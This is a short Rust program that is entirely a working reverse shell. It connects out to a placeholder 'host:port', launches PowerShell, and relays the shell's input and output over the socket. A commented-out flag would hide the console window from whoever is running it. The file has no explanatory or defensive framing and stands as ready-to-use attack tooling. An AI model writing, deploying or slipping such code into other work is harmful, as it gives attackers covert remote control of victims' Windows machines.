use std::io::copy;
use std::net::TcpStream;
// use std::os::windows::process::CommandExt;
use std::process::{Command, Stdio};
use std::thread::spawn;

const HOST: &str = "host:port";
const SHELL: &str = "powershell";

fn main() -> Result<(), std::io::Error> {
    let mut stream = TcpStream::connect(HOST)?;

    let child = Command::new(SHELL)
        // .creation_flags(0x08000000)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let mut stdout = stream.try_clone()?;
    let mut stderr = stream.try_clone()?;
    spawn(move || copy(&mut child.stdout.unwrap(), &mut stdout));
    spawn(move || copy(&mut child.stderr.unwrap(), &mut stderr));
    copy(&mut stream, &mut child.stdin.unwrap())?;

    Ok(())
}
